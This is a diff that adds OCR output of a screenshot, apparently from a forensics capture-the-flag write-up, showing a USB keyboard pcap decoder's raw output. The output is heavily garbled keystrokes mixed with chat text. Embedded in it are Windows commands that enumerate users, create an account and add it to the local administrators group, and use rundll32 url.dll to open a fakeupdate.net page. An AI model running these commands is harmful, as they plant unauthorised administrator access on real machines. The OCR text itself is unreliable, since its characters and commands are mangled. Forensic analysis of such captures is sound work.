@@ -1,0 +1,21 @@
+# OCR: 5f9c76f06b311c44fdcf6e36b9f38987.webp
+# 来源: .\02-WriteUp\2025\5f9c76f06b311c44fdcf6e36b9f38987.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:28
+
+1255 @ WXjzc in ~/software/UsbKeyboardDataHacker A 910 xl
+$ python3 pcap2text.py /nnt/9/2625 平 航 杯 儿 5BPcap.pcapng
+Raw output:
+'M}8[F21] [F20] [RIGHTARROW] [F6]{@M{M#{ }##8MMbao bao, Zui jin you ge nan sheng xiang zhui wo,ta jiao
+\x08\x08\x68\x08qi zao wang ta shuo ta ai wo,dan shi cong bu bang wo na kuai di,hao fan arcmd\n[F21][F
+F21]LJ8[LEFTARROM]D[F21]F6HI[F21]KLNO[F21]H[LEFTARROu]LJ[LEFTARROM] [LEFTARROW] I }[F7]H}1#J }K#LMKMHIGMFM
+EDMBCAABB[ RIGHTARROW] {@{ [F6]{ [RIGHTARROW] [F6]{@7@{@{@{ [F6] [RIGHTARROW] 7 [RIGHTARROW] 7[ RIGHTARROW] {@LLLLLLLM
+am{ }{#[F6]{M@MMMMM} [LEFTARROW] A[F21 ] BCEDEMDE}[LEFTARROW] ESF [F21]EG8I[LEFTARROW] F#CBA[F21]8[LEFTARROW] }#MAC
+MCF# }HGHF }ERDC}#B} }HIMMMM [F6] [F6] [RIGHTARROW] 7[RIGHTARROW] [F6]{L@LABEEGFDCA whoami\nnet user\nnet user qia
+nqianwoainia abcdefghijk[CAPSLOCK]i[CAPSLOCK]mn /add\nnet localgroup administrators qianqianwoainia /add\n
+net user qiangianwoaini4 /del7{[F20] [F20] [F20]7[F20]7[F20]L@[F6] [Fé] [RIGHTARROW] [Fé] [RIGHTARROW] {{@LML@@L@
+LLLLLLLC[LEFTARROW] GIKLMLIHHFECB[F21]8[F7] }[F6] [RIGHTARROW] 777 [RIGHTARROW] [F6] [RIGHTARROW] [Fo] [Fo] [Fo]{@{@
+({{IFO]{[F6][FOI{[FO]{@{@LMLM\nnet localgroup administrators qianqianwoainid /add\nrund1132 url.d11, [CAPSL
+OCK] [CAPSLOCK]ile[ CAPSLOCK]p[CAPSLOCK ]rotocol[CAPSLOCK]h[CAPSLOCK]andler https; //fakeupdate .net/wintoue/b
+sod. htm1GMIK#GECMA#MMAM\ NCE [F21 ]GBH[LEFTARROW] KM[F7]N[F7] [F7]L[F7]}J[F7]H}F[LEFTARROW]D8B[F20]7[F20] [F20][
+F20][F20] 7[F20] [F7] [RIGHTARROW] [F7] [RIGHTARROW] [LEFTARROW] 7LLLLLLLL*
